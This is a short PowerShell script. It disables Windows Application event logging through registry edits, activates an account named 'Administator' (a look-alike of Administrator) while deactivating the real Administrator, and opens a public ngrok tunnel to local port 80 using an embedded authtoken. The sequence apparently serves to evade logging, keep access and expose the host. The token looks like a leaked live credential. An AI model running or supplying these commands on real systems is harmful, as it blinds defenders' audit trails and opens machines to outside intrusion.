#Disabled the EventLog Service
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 4 -Type DWord

net user Administator /active:yes
net user Administrator /active:no

& "C:\Program Files\Ngrok\ngrok.exe" config add-authtoken 285vxc8yv5IwEOSAb5Jmt2jyTzT_7xdB35F5q6Tay8M5Utum4
& "C:\Program Files\Ngrok\ngrok.exe" http 80
